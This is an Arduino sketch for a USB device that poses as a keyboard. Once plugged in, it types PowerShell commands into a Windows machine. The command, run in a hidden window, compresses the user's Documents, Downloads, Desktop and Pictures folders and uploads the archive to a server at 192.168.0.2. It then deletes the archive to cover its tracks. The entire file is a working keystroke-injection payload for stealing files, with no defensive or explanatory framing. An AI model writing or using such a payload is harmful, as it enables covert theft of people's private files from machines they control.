#include <Arduino.h>
#include <DigiKeyboard.h>

const char* SERVER_UPLOAD = "http://192.168.0.2:5000/upload";

void setup() {

}

void loop() {
  // Open Powershell
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);

  DigiKeyboard.print(F("Start-Process powershell -ArgumentList \"-WindowStyle Hidden -Command Compress-Archive -Path 'C:\\Users\\$env:USERNAME\\Documents\\*', 'C:\\Users\\$env:USERNAME\\Downloads\\*', 'C:\\Users\\$env:USERNAME\\Desktop\\*', 'C:\\Users\\$env:USERNAME\\Pictures\\*' -DestinationPath 'C:\\Users\\$env:USERNAME\\Documents\\$env:COMPUTERNAME.zip' -Force; (New-Object System.Net.WebClient).UploadFile('"));
  DigiKeyboard.print(SERVER_UPLOAD);
  DigiKeyboard.print(F("', 'POST', 'C:\\Users\\$env:USERNAME\\Documents\\$env:COMPUTERNAME.zip'); Remove-Item 'C:\\Users\\$env:USERNAME\\Documents\\$env:COMPUTERNAME.zip' -Force\" -WindowStyle Hidden"));
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.print("exit");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){ /*empty*/ }
}